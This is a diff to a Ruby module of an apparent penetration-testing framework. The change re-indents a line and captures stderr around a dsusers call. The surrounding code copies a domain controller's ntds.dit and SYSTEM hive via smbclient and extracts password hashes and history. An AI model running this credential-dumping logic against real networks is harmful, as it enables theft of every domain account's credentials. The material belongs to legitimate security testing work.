@@ -189,7 +189,7 @@ class Hashesdc < Poet::Scanner
 							# Print percent every five seconds
 							progress(file_size, "#{local_drop}/#{ntds_filename}") until ntdsthread.join(1)
 
-								print " Complete"
+							print " Complete"
 							puts 
 
 							copy_sys = smbclient(clientoptions, "get #{@drop_path}\\sys #{local_drop}/#{sys_filename}")
@@ -235,10 +235,12 @@ class Hashesdc < Poet::Scanner
 								linktable = /Exporting table (\d) \(link_table\) out of \d+\./.match(esedump)[1]
 								datatable = "#{local_drop}/ntds.dit\.export/datatable\.#{datatable.to_i - 1}"
 								linktable = "#{local_drop}/ntds.dit\.export/link_table\.#{linktable.to_i - 1}"
-
+								
+								dsusers = ''
+								capture_stderr {
 								# Parse with dsusers
-								dsusers = `python #{Menu.extbin[:dsusers]} #{datatable} #{linktable} --passwordhashes #{local_drop}/#{sys_filename} --passwordhistory #{local_drop}/#{sys_filename}`
-
+									dsusers = `python #{Menu.extbin[:dsusers]} #{datatable} #{linktable} --passwordhashes #{local_drop}/#{sys_filename} --passwordhistory #{local_drop}/#{sys_filename}`
+								}
 								# Write output to temp file, doesn't currently support stdin
 								begin
 									File.open("#{local_drop}/dsusers.txt", 'w') { |file| file.write(dsusers) }
